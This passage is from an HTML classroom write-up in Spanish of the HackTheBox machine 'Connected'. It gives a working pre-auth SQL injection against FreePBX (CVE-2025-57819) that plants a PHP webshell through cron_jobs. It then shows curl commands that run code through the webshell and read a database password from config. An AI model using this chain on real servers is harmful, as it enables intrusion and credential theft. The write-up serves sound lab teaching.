@@ -1,0 +1,687 @@
+<title>Connected — Write-up</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<style>
+  /* Layout: single reading column, dark-first terminal/lab aesthetic, numbered phases as real sequence */
+  :root{
+    --bg:#0d1117; --panel:#161b22; --panel-2:#1c2330; --border:#2a3341;
+    --fg:#e6edf3; --muted:#9aa7b4; --faint:#6b7684;
+    --accent:#3fb950;      /* asterisk/terminal green */
+    --accent-2:#58a6ff;    /* link blue */
+    --warn:#d29922; --crit:#f85149; --root:#f0883e;
+    --code-bg:#11161d;
+    --font-head:"Space Grotesk",system-ui,sans-serif;
+    --font-body:"Inter",system-ui,sans-serif;
+    --font-mono:"JetBrains Mono",ui-monospace,"Cascadia Code",Menlo,monospace;
+    color-scheme:dark;
+  }
+  :root[data-theme="light"]{
+    --bg:#f6f8fa; --panel:#ffffff; --panel-2:#f0f3f6; --border:#d6dde5;
+    --fg:#1f2937; --muted:#55606c; --faint:#808a95;
+    --accent:#1a7f37; --accent-2:#0969da;
+    --warn:#9a6700; --crit:#cf222e; --root:#bc4c00;
+    --code-bg:#0d1117;  /* keep terminals dark even in light mode for authenticity */
+    color-scheme:light;
+  }
+  @media (prefers-color-scheme: light){
+    :root:not([data-theme="dark"]){
+      --bg:#f6f8fa; --panel:#ffffff; --panel-2:#f0f3f6; --border:#d6dde5;
+      --fg:#1f2937; --muted:#55606c; --faint:#808a95;
+      --accent:#1a7f37; --accent-2:#0969da;
+      --warn:#9a6700; --crit:#cf222e; --root:#bc4c00;
+      --code-bg:#0d1117;
+      color-scheme:light;
+    }
+  }
+
+  *{box-sizing:border-box}
+  body{
+    background:var(--bg); color:var(--fg);
+    font-family:var(--font-body); line-height:1.65;
+    padding-left:max(16px,env(safe-area-inset-left,0px));
+    padding-right:max(16px,env(safe-area-inset-right,0px));
+    padding-block:0;
+  }
+  .wrap{max-width:860px; margin:0 auto; padding-block:32px 72px}
+
+  /* ---- header ---- */
+  header.hero{
+    border:1px solid var(--border); border-radius:14px; overflow:hidden;
+    background:linear-gradient(160deg,var(--panel-2),var(--panel));
+    margin-bottom:34px;
+  }
+  .hero-bar{display:flex; align-items:center; gap:8px; padding:10px 14px; background:var(--code-bg); border-bottom:1px solid var(--border)}
+  .dot{width:11px;height:11px;border-radius:50%}
+  .dot.r{background:#f85149}.dot.y{background:#d29922}.dot.g{background:#3fb950}
+  .hero-bar .path{margin-left:10px; font-family:var(--font-mono); font-size:.8rem; color:var(--faint)}
+  .hero-body{padding:26px 24px 30px}
+  .eyebrow{font-family:var(--font-mono); font-size:.72rem; letter-spacing:.18em; text-transform:uppercase; color:var(--accent); margin:0 0 10px}
+  h1{font-family:var(--font-head); font-size:clamp(2rem,6vw,3rem); line-height:1.05; margin:0 0 6px; text-wrap:balance; letter-spacing:-.02em}
+  .sub{color:var(--muted); font-size:1.05rem; margin:0 0 20px}
+  .meta{display:flex; flex-wrap:wrap; gap:8px}
+  .chip{font-family:var(--font-mono); font-size:.74rem; padding:5px 10px; border-radius:999px; border:1px solid var(--border); background:var(--panel); color:var(--muted)}
+  .chip b{color:var(--fg); font-weight:600}
+  .chip.easy{color:var(--accent); border-color:color-mix(in srgb,var(--accent) 45%,var(--border))}
+
+  /* ---- generic sections ---- */
+  section{margin:0 0 20px}
+  h2{font-family:var(--font-head); font-size:1.5rem; letter-spacing:-.01em; margin:40px 0 4px; display:flex; align-items:baseline; gap:12px; text-wrap:balance}
+  h2 .num{font-family:var(--font-mono); font-size:.9rem; color:var(--accent); background:color-mix(in srgb,var(--accent) 14%,transparent); border:1px solid color-mix(in srgb,var(--accent) 35%,var(--border)); border-radius:7px; padding:2px 9px; flex:none}
+  h3{font-family:var(--font-head); font-size:1.12rem; margin:26px 0 6px; color:var(--fg)}
+  h2 + .lead{color:var(--muted); margin:2px 0 12px}
+  p{margin:12px 0}
+  a{color:var(--accent-2); text-decoration:none; border-bottom:1px solid color-mix(in srgb,var(--accent-2) 40%,transparent)}
+  a:hover{border-bottom-color:var(--accent-2)}
+  strong{color:var(--fg)}
+  code.inl{font-family:var(--font-mono); font-size:.86em; background:var(--panel-2); border:1px solid var(--border); border-radius:5px; padding:1px 6px; color:var(--fg); overflow-wrap:break-word}
+
+  /* ---- terminal / code blocks ---- */
+  .term{border:1px solid var(--border); border-radius:10px; overflow:hidden; margin:16px 0; background:var(--code-bg)}
+  .term-head{display:flex; align-items:center; gap:7px; padding:7px 12px; background:#0a0e14; border-bottom:1px solid var(--border)}
+  .term-head .lbl{margin-left:8px; font-family:var(--font-mono); font-size:.72rem; color:var(--faint); letter-spacing:.04em}
+  .term-head .tag{margin-left:auto; font-family:var(--font-mono); font-size:.68rem; padding:2px 8px; border-radius:5px; border:1px solid var(--border)}
+  .tag.attacker{color:#58a6ff; border-color:#1f4a7a}
+  .tag.asterisk{color:#3fb950; border-color:#1d5a2c}
+  .tag.root{color:#f0883e; border-color:#7a4116}
+  .tag.sql{color:#d2a8ff; border-color:#5a3a7a}
+  pre{margin:0; padding:14px 16px; overflow-x:auto; font-family:var(--font-mono); font-size:.82rem; line-height:1.6; color:#e6edf3}
+  pre .c{color:#7681c0}                 /* comment */
+  pre .p{color:#3fb950; user-select:none}/* prompt */
+  pre .o{color:#8b949e}                  /* dim / output */
+  pre .k{color:#ff7b72}                  /* keyword/command */
+  pre .s{color:#a5d6ff}                  /* string */
+  pre .hl{color:#f0883e; font-weight:600}/* highlight */
+  pre .fl{color:#d2a8ff}                 /* flag value */
+
+  /* explanation list under a command */
+  .explain{border:1px solid var(--border); border-top:none; border-radius:0 0 10px 10px; margin:-16px 0 16px; background:var(--panel); padding:12px 16px}
+  .explain .etitle{font-family:var(--font-mono); font-size:.7rem; text-transform:uppercase; letter-spacing:.12em; color:var(--faint); margin:0 0 8px}
+  dl{margin:0; display:grid; grid-template-columns:auto 1fr; gap:6px 14px}
+  dl dt{font-family:var(--font-mono); font-size:.8rem; color:var(--accent); white-space:nowrap}
+  dl dd{margin:0; color:var(--muted); font-size:.92rem; min-width:0}
+  dl dd b{color:var(--fg); font-weight:600}
+  @media(max-width:520px){ dl{grid-template-columns:1fr; gap:2px 0} dl dt{margin-top:8px} }
+
+  /* callouts */
+  .note{border-left:3px solid var(--accent-2); background:var(--panel); border-radius:0 8px 8px 0; padding:12px 16px; margin:16px 0; font-size:.94rem}
+  .note.warn{border-left-color:var(--warn)}
+  .note.crit{border-left-color:var(--crit)}
+  .note.root{border-left-color:var(--root)}
+  .note .nt{font-family:var(--font-mono); font-size:.7rem; text-transform:uppercase; letter-spacing:.1em; color:var(--faint); display:block; margin-bottom:3px}
+
+  /* flag box */
+  .flag{display:flex; flex-wrap:wrap; align-items:center; gap:10px 14px; border:1px solid color-mix(in srgb,var(--accent) 35%,var(--border)); background:color-mix(in srgb,var(--accent) 8%,var(--panel)); border-radius:9px; padding:12px 16px; margin:12px 0}
+  .flag .lab{font-family:var(--font-mono); font-size:.72rem; text-transform:uppercase; letter-spacing:.1em; color:var(--accent)}
+  .flag .val{font-family:var(--font-mono); font-size:.9rem; color:var(--fg); overflow-wrap:anywhere}
+
+  /* chain diagram */
+  .chain{display:flex; flex-wrap:wrap; align-items:stretch; gap:8px; margin:18px 0}
+  .chain .step{flex:1 1 150px; min-width:0; border:1px solid var(--border); border-radius:9px; background:var(--panel); padding:11px 13px}
+  .chain .step .n{font-family:var(--font-mono); font-size:.68rem; color:var(--accent); letter-spacing:.1em}
+  .chain .step .t{font-family:var(--font-head); font-weight:600; font-size:.98rem; margin:3px 0 2px}
+  .chain .step .d{font-size:.8rem; color:var(--muted)}
+  .chain .arr{align-self:center; color:var(--faint); font-size:1.1rem; flex:none}
+  @media(max-width:620px){ .chain .arr{display:none} }
+
+  table{width:100%; border-collapse:collapse; margin:14px 0; font-size:.9rem}
+  th,td{text-align:left; padding:8px 10px; border-bottom:1px solid var(--border); vertical-align:top}
+  th{font-family:var(--font-mono); font-size:.72rem; text-transform:uppercase; letter-spacing:.08em; color:var(--faint)}
+  td code{font-family:var(--font-mono); font-size:.84em; color:var(--fg)}
+
+  footer{margin-top:50px; padding-top:20px; border-top:1px solid var(--border); color:var(--faint); font-size:.82rem}
+  .toc{border:1px solid var(--border); border-radius:10px; background:var(--panel); padding:14px 18px; margin:0 0 10px}
+  .toc .tt{font-family:var(--font-mono); font-size:.7rem; text-transform:uppercase; letter-spacing:.12em; color:var(--faint); margin:0 0 8px}
+  .toc ol{margin:0; padding-left:20px; columns:2; column-gap:26px}
+  .toc li{margin:3px 0}
+  @media(max-width:520px){ .toc ol{columns:1} }
+</style>
+
+<div class="wrap">
+
+  <header class="hero">
+    <div class="hero-bar">
+      <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+      <span class="path">root@kali:~/htb/connected#</span>
+    </div>
+    <div class="hero-body">
+      <p class="eyebrow">HackTheBox · Write-up para clase</p>
+      <h1>Connected</h1>
+      <p class="sub">De cero a <strong>root</strong> en un FreePBX 16: SQLi pre-autenticación (CVE-2025-57819) &rarr; webshell como <code class="inl">asterisk</code> &rarr; escalada vía <code class="inl">incron</code>.</p>
+      <div class="meta">
+        <span class="chip easy"><b>Dificultad</b> · Easy</span>
+        <span class="chip"><b>SO</b> · CentOS 7</span>
+        <span class="chip"><b>IP</b> · 10.129.152.158</span>
+        <span class="chip"><b>App</b> · FreePBX 16.0.40.7</span>
+        <span class="chip"><b>CVE</b> · 2025-57819</span>
+      </div>
+    </div>
+  </header>
+
+  <nav class="toc">
+    <p class="tt">Índice</p>
+    <ol>
+      <li><a href="#prep">Preparación del entorno</a></li>
+      <li><a href="#req">Requisitos y descargas</a></li>
+      <li><a href="#recon">Reconocimiento (nmap)</a></li>
+      <li><a href="#web">Enumeración web</a></li>
+      <li><a href="#cve">Foothold: CVE-2025-57819</a></li>
+      <li><a href="#shell">Webshell y user flag</a></li>
+      <li><a href="#loot">Credenciales y enumeración local</a></li>
+      <li><a href="#privesc">Escalada a root (incron)</a></li>
+      <li><a href="#root">Root flag</a></li>
+      <li><a href="#scripts">Scripts completos</a></li>
+      <li><a href="#lessons">Lecciones y mitigación</a></li>
+    </ol>
+  </nav>
+
+  <div class="chain">
+    <div class="step"><div class="n">01</div><div class="t">SQLi pre-auth</div><div class="d">Módulo <code class="inl">endpoint</code> de FreePBX</div></div>
+    <span class="arr">&rarr;</span>
+    <div class="step"><div class="n">02</div><div class="t">Webshell</div><div class="d">INSERT en <code class="inl">cron_jobs</code> &rarr; <code class="inl">asterisk</code></div></div>
+    <span class="arr">&rarr;</span>
+    <div class="step"><div class="n">03</div><div class="t">incron hook</div><div class="d"><code class="inl">sysadmin_manager</code> como root</div></div>
+    <span class="arr">&rarr;</span>
+    <div class="step"><div class="n">04</div><div class="t">root</div><div class="d"><code class="inl">/bin/bash</code> SUID</div></div>
+  </div>
+
+  <!-- ============ 0. PREP ============ -->
+  <section id="prep">
+    <h2><span class="num">0</span>Preparación del entorno</h2>
+    <p class="lead">Antes de atacar, confirmamos conectividad con la VPN de HackTheBox.</p>
+
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">bash</span><span class="tag attacker">atacante · kali</span></div>
+<pre><span class="p">$ </span><span class="k">ping</span> -c 2 10.129.152.158
+<span class="o">64 bytes from 10.129.152.158: icmp_seq=1 ttl=63 time=190 ms</span></pre>
+    </div>
+    <div class="explain">
+      <p class="etitle">Qué hace cada parte</p>
+      <dl>
+        <dt>ping</dt><dd>Envía paquetes ICMP para ver si la máquina responde (está "viva").</dd>
+        <dt>-c 2</dt><dd>Limita a <b>2 paquetes</b> y termina (si no, haría ping infinito).</dd>
+        <dt>ttl=63</dt><dd>Pista del SO: un TTL que llega a 63 suele venir de un valor inicial <b>64</b> (Linux) tras pasar 1 salto (el router de la VPN). Windows arrancaría en 128.</dd>
+      </dl>
+    </div>
+
+    <div class="note">
+      <span class="nt">Nota de clase</span>
+      La IP <code class="inl">10.129.x.x</code> es el rango típico de las máquinas de HackTheBox a través de la VPN. Todo el laboratorio está <strong>autorizado</strong>: solo atacamos objetivos para los que tenemos permiso.
+    </div>
+  </section>
+
+  <!-- ============ REQUISITOS ============ -->
+  <section id="req">
+    <h2><span class="num">R</span>Requisitos y descargas</h2>
+    <p class="lead">Buenas noticias: <strong>no hace falta descargar ningún exploit de terceros</strong>. Todo se hace con herramientas que ya trae Kali Linux. Lo único que "generamos" son dos cadenas de texto (un webshell en base64 y el nombre de fichero del hook), y eso lo hacemos nosotros mismos.</p>
+
+    <h3>Herramientas (ya vienen en Kali)</h3>
+    <div class="explain" style="margin:16px 0; border-radius:10px; border-top:1px solid var(--border)">
+      <p class="etitle">Lo que usamos</p>
+      <dl>
+        <dt>openvpn</dt><dd>Para conectarte a la VPN de HackTheBox con tu fichero <code>.ovpn</code> (<code>sudo openvpn lab.ovpn</code>). Sin esto no hay conectividad con la máquina.</dd>
+        <dt>nmap</dt><dd>Escaneo de puertos y servicios.</dd>
+        <dt>curl</dt><dd>Toda la explotación (SQLi, webshell, comandos) se hace con <code>curl</code>. Nada de binarios raros.</dd>
+        <dt>python3</dt><dd>Solo para generar el nombre de fichero del hook de incron (módulos <code>json</code>, <code>zlib</code>, <code>base64</code>, todos de la librería estándar).</dd>
+        <dt>base64</dt><dd>Para codificar el webshell. Viene en todos los Linux (<code>coreutils</code>).</dd>
+      </dl>
+    </div>
+
+    <h3>Lo único "a generar" (no se descarga nada)</h3>
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">bash · generar el webshell en base64</span><span class="tag attacker">atacante · kali</span></div>
+<pre><span class="c"># Codificamos nuestro webshell PHP en base64 para meterlo en el SQL sin comillas problemáticas</span>
+<span class="p">$ </span><span class="k">echo</span> -n <span class="s">'&lt;?php system($_GET[cmd]); ?&gt;'</span> | <span class="k">base64</span>
+<span class="hl">PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==</span></pre>
+    </div>
+    <div class="explain">
+      <p class="etitle">Qué hace cada parte</p>
+      <dl>
+        <dt>echo -n '…'</dt><dd>Imprime el código del webshell <b>sin</b> salto de línea final (<code>-n</code>), para que el base64 salga limpio.</dd>
+        <dt>| base64</dt><dd>Codifica esa cadena. El resultado es lo que luego el cron de la víctima decodificará con <code>base64 -d</code> para crear <code>webshell.php</code>.</dd>
+      </dl>
+    </div>
+
+    <div class="note warn">
+      <span class="nt">PoC públicos (opcional, NO necesario)</span>
+      Existen exploits "todo en uno" en GitHub para CVE-2025-57819 (p. ej. de <code class="inl">jf-gondim</code> o <code class="inl">HexBytee</code>). En clase hacemos el proceso <strong>a mano</strong> para entenderlo. Si alguna vez descargas un script de terceros: revísalo antes de ejecutarlo y lánzalo aislado (<code class="inl">python3 -I exploit.py</code>) — nunca ejecutes a ciegas código ajeno.
+    </div>
+  </section>
+
+  <!-- ============ 1. RECON ============ -->
+  <section id="recon">
+    <h2><span class="num">1</span>Reconocimiento con nmap</h2>
+    <p class="lead">Primero, qué puertos están abiertos. Hacemos dos pasadas: una rápida a todos los puertos y otra detallada a los que encontremos.</p>
+
+    <h3>1.1 — Barrido completo de puertos</h3>
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">bash</span><span class="tag attacker">atacante · kali</span></div>
+<pre><span class="p">$ </span><span class="k">nmap</span> -p- --min-rate 2000 -T4 -oN allports.txt 10.129.152.158
+
+<span class="o">PORT    STATE SERVICE</span>
+<span class="o">22/tcp  open  ssh</span>
+<span class="o">80/tcp  open  http</span>
+<span class="o">443/tcp open  https</span></pre>
+    </div>
+    <div class="explain">
+      <p class="etitle">Qué hace cada parte</p>
+      <dl>
+        <dt>-p-</dt><dd>Escanea <b>los 65535 puertos</b> TCP, no solo los 1000 habituales. Así no se nos escapa nada.</dd>
+        <dt>--min-rate 2000</dt><dd>Envía al menos <b>2000 paquetes/segundo</b>: acelera mucho el escaneo.</dd>
+        <dt>-T4</dt><dd>Plantilla de temporización "agresiva" (rápida). Va de T0 (sigiloso) a T5 (muy rápido).</dd>
+        <dt>-oN archivo</dt><dd>Guarda la salida en formato normal (<b>o</b>utput <b>N</b>ormal) para consultarla luego.</dd>
+      </dl>
+    </div>
+
+    <h3>1.2 — Versiones y scripts por defecto</h3>
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">bash</span><span class="tag attacker">atacante · kali</span></div>
+<pre><span class="p">$ </span><span class="k">nmap</span> -sC -sV -p22,80,443 10.129.152.158
+
+<span class="o">22/tcp  open  ssh   OpenSSH 7.4 (protocol 2.0)</span>
+<span class="o">80/tcp  open  http  Apache/2.4.6 (CentOS) ... PHP/7.4.16</span>
+<span class="o">|_http-title: Did not follow redirect to http://</span><span class="hl">connected.htb</span><span class="o">/</span>
+<span class="o">443/tcp open  ssl/http Apache httpd 2.4.6 (CentOS)</span>
+<span class="o">| ssl-cert: Subject: commonName=</span><span class="hl">pbxconnect</span><span class="o">/organizationName=...</span></pre>
+    </div>
+    <div class="explain">
+      <p class="etitle">Qué hace cada parte</p>
+      <dl>
+        <dt>-sV</dt><dd>Detecta la <b>versión</b> exacta de cada servicio (clave para buscar CVEs).</dd>
+        <dt>-sC</dt><dd>Lanza los <b>scripts por defecto</b> de nmap (NSE): títulos web, certificados, robots.txt…</dd>
+        <dt>-p22,80,443</dt><dd>Solo los puertos ya descubiertos, para ir rápido.</dd>
+      </dl>
+    </div>
+    <div class="note">
+      <span class="nt">Pistas que extraemos</span>
+      El puerto 80 nos <strong>redirige a <code class="inl">connected.htb</code></strong> (un virtual host) y el certificado TLS del 443 menciona <strong><code class="inl">pbxconnect</code></strong>. Ambas señales apuntan a un sistema de telefonía <strong>FreePBX / Asterisk</strong>.
+    </div>
+  </section>
+
+  <!-- ============ 2. WEB ENUM ============ -->
+  <section id="web">
+    <h2><span class="num">2</span>Enumeración web</h2>
+    <p class="lead">Como el sitio usa el nombre <code class="inl">connected.htb</code>, el servidor sirve contenido distinto según la cabecera <code class="inl">Host</code>. Lo resolvemos sin tocar <code class="inl">/etc/hosts</code> usando <code class="inl">--resolve</code> de curl.</p>
+
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">bash</span><span class="tag attacker">atacante · kali</span></div>
+<pre><span class="p">$ </span><span class="k">curl</span> -s -I --resolve connected.htb:80:10.129.152.158 http://connected.htb/
+<span class="o">HTTP/1.1 302 Found</span>
+<span class="o">Location: /admin</span>
+
+<span class="p">$ </span><span class="k">curl</span> -sk -L --resolve connected.htb:80:10.129.152.158 http://connected.htb/admin/ | grep -i freepbx
+<span class="o">&lt;title&gt;</span><span class="hl">FreePBX Administration</span><span class="o">&lt;/title&gt; ... FreePBX </span><span class="hl">16.0.40.7</span><span class="o"> is licensed under the GPL</span></pre>
+    </div>
+    <div class="explain">
+      <p class="etitle">Qué hace cada parte</p>
+      <dl>
+        <dt>--resolve host:puerto:IP</dt><dd>Le dice a curl "cuando pidas <code>connected.htb:80</code>, usa esta IP". Equivale a editar <code>/etc/hosts</code>, pero <b>temporal y sin permisos de root</b>.</dd>
+        <dt>-s</dt><dd><b>Silent</b>: oculta la barra de progreso.</dd>
+        <dt>-I</dt><dd>Pide solo las <b>cabeceras</b> (petición HEAD). Vemos el <code>302 → /admin</code>.</dd>
+        <dt>-k</dt><dd><b>Insecure</b>: acepta el certificado TLS autofirmado del 443 sin quejarse.</dd>
+        <dt>-L</dt><dd>Sigue las redirecciones (<b>L</b>ocation) hasta la página final.</dd>
+        <dt>| grep -i freepbx</dt><dd>Filtra la salida buscando "freepbx" sin distinguir mayúsculas (<code>-i</code>).</dd>
+      </dl>
+    </div>
+    <div class="note crit">
+      <span class="nt">El hallazgo clave</span>
+      <strong>FreePBX 16.0.40.7</strong>. Esta versión es vulnerable a <strong>CVE-2025-57819</strong>: inyección SQL <em>sin autenticación</em> en el módulo <code class="inl">endpoint</code>, que se puede encadenar hasta ejecución remota de comandos (RCE).
+    </div>
+  </section>
+
+  <!-- ============ 3. CVE ============ -->
+  <section id="cve">
+    <h2><span class="num">3</span>Foothold — CVE-2025-57819</h2>
+    <p class="lead">La vulnerabilidad vive en <code class="inl">/admin/ajax.php</code>. Normalmente ese endpoint exige estar logueado y comprueba la cabecera <code class="inl">Referer</code>, pero si invocamos el módulo por su <strong>nombre de clase con namespace</strong> (<code class="inl">FreePBX\modules\endpoint\ajax</code>) se salta ese control. El parámetro <code class="inl">brand</code> se concatena directamente en una consulta SQL.</p>
+
+    <h3>3.1 — Entendiendo el payload</h3>
+    <p>Usamos una <strong>stacked query</strong> (consulta apilada): cerramos la cadena original con <code class="inl">'</code>, añadimos <code class="inl">;</code> y nuestra propia sentencia <code class="inl">INSERT</code>, y comentamos el resto con <code class="inl">-- </code> (dos guiones y un espacio). Insertamos una tarea en la tabla <code class="inl">cron_jobs</code>, que FreePBX ejecuta cada minuto, para que escriba un webshell PHP en el directorio web.</p>
+
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">payload SQL (lo que inyectamos en brand=)</span><span class="tag sql">SQL</span></div>
+<pre><span class="k">x'</span> ;<span class="k">INSERT INTO</span> cron_jobs
+  (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)
+<span class="k">VALUES</span> (<span class="s">'sysadmin'</span>,<span class="s">'webshell'</span>,
+  <span class="s">'echo PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==|base64 -d &gt;/var/www/html/webshell.php'</span>,
+  <span class="k">NULL</span>,<span class="s">'* * * * *'</span>,30,1,1) <span class="hl">-- </span></pre>
+    </div>
+    <div class="explain">
+      <p class="etitle">Anatomía del payload</p>
+      <dl>
+        <dt>x'</dt><dd>Cierra la comilla de la consulta original de FreePBX.</dd>
+        <dt>;</dt><dd>Termina esa consulta y permite <b>apilar</b> una nueva (stacked query).</dd>
+        <dt>INSERT INTO cron_jobs</dt><dd>Añade una fila a la tabla de tareas programadas de FreePBX.</dd>
+        <dt>command</dt><dd>El comando que ejecutará el cron. Decodifica un base64 y lo escribe como <code>webshell.php</code>.</dd>
+        <dt>PD9waHAg…Pg==</dt><dd>Es <code>&lt;?php system($_GET[cmd]); ?&gt;</code> en base64. Lo codificamos para evitar comillas problemáticas dentro del SQL.</dd>
+        <dt>'* * * * *'</dt><dd>El <code>schedule</code> cron: <b>cada minuto</b>.</dd>
+        <dt>enabled = 1</dt><dd>La tarea queda activa.</dd>
+        <dt>-- </dt><dd>Comenta el resto de la consulta original para que no dé error de sintaxis. <b>Ojo: el espacio final es obligatorio</b> en MySQL.</dd>
+      </dl>
+    </div>
+
+    <h3>3.2 — Enviando la inyección</h3>
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">bash</span><span class="tag attacker">atacante · kali</span></div>
+<pre><span class="p">$ </span><span class="k">curl</span> -sk -G --resolve connected.htb:443:10.129.152.158 \
+    <span class="s">"https://connected.htb/admin/ajax.php"</span> \
+    --data-urlencode <span class="s">'module=FreePBX\modules\endpoint\ajax'</span> \
+    --data-urlencode <span class="s">'command=model'</span> \
+    --data-urlencode <span class="s">'template=x'</span> \
+    --data-urlencode <span class="s">'model=model'</span> \
+    --data-urlencode <span class="s">"brand=$PAYLOAD"</span>
+
+<span class="o">{"error":{... "file":"...\/modules\/endpoint\/views\/model.php","line":144}}</span>
+<span class="o">[HTTP 500]</span></pre>
+    </div>
+    <div class="explain">
+      <p class="etitle">Qué hace cada parte</p>
+      <dl>
+        <dt>-G</dt><dd>Fuerza el método <b>GET</b> y adjunta los <code>--data-urlencode</code> como parámetros de la URL (<code>?a=b&c=d</code>).</dd>
+        <dt>--data-urlencode</dt><dd>Codifica cada valor para la URL (espacios, comillas, barras…). Imprescindible porque el payload lleva caracteres especiales.</dd>
+        <dt>module=FreePBX\modules\endpoint\ajax</dt><dd>El truco: llamar al módulo por su clase con <b>namespace</b> salta el control de <code>Referer</code> y de autenticación.</dd>
+        <dt>brand=$PAYLOAD</dt><dd>Aquí va nuestra inyección SQL.</dd>
+      </dl>
+    </div>
+    <div class="note">
+      <span class="nt">¿Un error 500 es malo?</span>
+      No. El <code class="inl">HTTP 500</code> con el error en <code class="inl">model.php:144</code> confirma que <strong>nuestra consulta llegó y se ejecutó</strong>: la aplicación revienta <em>después</em> de nuestro <code class="inl">INSERT</code>, al intentar usar un resultado que ya no existe. La fila maliciosa quedó insertada.
+    </div>
+  </section>
+
+  <!-- ============ 4. SHELL ============ -->
+  <section id="shell">
+    <h2><span class="num">4</span>Webshell y user flag</h2>
+    <p class="lead">El cron de FreePBX corre cada minuto. Esperamos ~60&nbsp;s y comprobamos si el webshell ya existe pidiéndole que ejecute <code class="inl">id</code>.</p>
+
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">bash</span><span class="tag attacker">atacante · kali</span></div>
+<pre><span class="p">$ </span><span class="k">curl</span> -sk --resolve connected.htb:443:10.129.152.158 \
+    <span class="s">"https://connected.htb/webshell.php?cmd=id"</span>
+<span class="hl">uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)</span></pre>
+    </div>
+    <div class="explain">
+      <p class="etitle">Qué hace cada parte</p>
+      <dl>
+        <dt>webshell.php?cmd=id</dt><dd>Nuestro <code>&lt;?php system($_GET[cmd]);?&gt;</code> toma el parámetro <code>cmd</code> y lo ejecuta en el sistema. Aquí ejecuta <code>id</code>.</dd>
+        <dt>uid=999(asterisk)</dt><dd>Tenemos ejecución de comandos como el usuario <b>asterisk</b> (el que corre el servidor web/PBX). Ya estamos "dentro".</dd>
+      </dl>
+    </div>
+
+    <h3>4.1 — Función cómoda para repetir comandos</h3>
+    <p>Para no reescribir el <code class="inl">curl</code> entero cada vez, definimos una función de shell:</p>
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">bash</span><span class="tag attacker">atacante · kali</span></div>
+<pre><span class="c"># "sh <comando>" lanzará el comando en la víctima a través del webshell</span>
+<span class="k">sh</span>() { <span class="k">curl</span> -sk -G --resolve connected.htb:443:10.129.152.158 \
+       <span class="s">"https://connected.htb/webshell.php"</span> --data-urlencode <span class="s">"cmd=$1"</span>; }
+
+<span class="p">$ </span><span class="k">sh</span> <span class="s">'cat /home/asterisk/user.txt'</span></pre>
+    </div>
+    <div class="explain">
+      <p class="etitle">Qué hace cada parte</p>
+      <dl>
+        <dt>sh() { … }</dt><dd>Define una <b>función</b> de bash llamada <code>sh</code>.</dd>
+        <dt>"cmd=$1"</dt><dd><code>$1</code> es el primer argumento que le pasemos a la función. Así <code>sh 'id'</code> ejecuta <code>id</code> en la víctima.</dd>
+        <dt>--data-urlencode</dt><dd>Vuelve a codificar el comando para la URL (comandos con espacios o <code>/</code> funcionan sin romperse).</dd>
+      </dl>
+    </div>
+
+    <div class="flag">
+      <span class="lab">user.txt</span>
+      <span class="val fl">5e05cd48732c4e88e907dbf86ab0d350</span>
+    </div>
+  </section>
+
+  <!-- ============ 5. LOOT ============ -->
+  <section id="loot">
+    <h2><span class="num">5</span>Credenciales y enumeración local</h2>
+    <p class="lead">Como usuario <code class="inl">asterisk</code>, buscamos credenciales. FreePBX guarda las de la base de datos en texto claro en sus ficheros de configuración.</p>
+
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">webshell · víctima</span><span class="tag asterisk">asterisk</span></div>
+<pre><span class="p">$ </span><span class="k">sh</span> <span class="s">'cat /etc/freepbx.conf'</span>
+<span class="o">$amp_conf["AMPDBUSER"] = </span><span class="s">"freepbxuser"</span><span class="o">;</span>
+<span class="o">$amp_conf["AMPDBPASS"] = </span><span class="hl">"mZzDpAGKTmPJ"</span><span class="o">;</span>
+<span class="o">$amp_conf["AMPDBNAME"] = </span><span class="s">"asterisk"</span><span class="o">;</span></pre>
+    </div>
+    <div class="explain">
+      <p class="etitle">Qué obtenemos</p>
+      <dl>
+        <dt>AMPDBUSER / PASS</dt><dd>Usuario y contraseña de MySQL: <code>freepbxuser:mZzDpAGKTmPJ</code>. Nos da acceso total a la base de datos <code>asterisk</code>.</dd>
+        <dt>¿Por qué importa?</dt><dd>La escalada de privilegios dependerá de <b>modificar una tabla</b> de esa base de datos.</dd>
+      </dl>
+    </div>
+
+    <h3>5.1 — Buscando qué corre como root</h3>
+    <p>El objetivo ahora es encontrar algo que el usuario <strong>root</strong> ejecute y que nosotros (asterisk) podamos influir. Revisamos SUID, capabilities, cron e <code class="inl">incron</code>.</p>
+
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">webshell · víctima</span><span class="tag asterisk">asterisk</span></div>
+<pre><span class="p">$ </span><span class="k">sh</span> <span class="s">'cat /etc/incron.d/*'</span>
+<span class="o">/var/spool/asterisk/incron  IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE  </span><span class="hl">/usr/bin/sysadmin_manager $#</span>
+<span class="o">/var/spool/asterisk/sysadmin/update_system_cron  IN_CLOSE_WRITE  /usr/sbin/sysadmin_update_set_cron</span>
+<span class="o">...</span>
+
+<span class="p">$ </span><span class="k">sh</span> <span class="s">'ls -ld /var/spool/asterisk/incron'</span>
+<span class="hl">drwxrwxr-x. 2 asterisk asterisk</span><span class="o"> /var/spool/asterisk/incron</span>   <span class="c"># ¡escribible por nosotros!</span></pre>
+    </div>
+    <div class="explain">
+      <p class="etitle">El concepto: incron</p>
+      <dl>
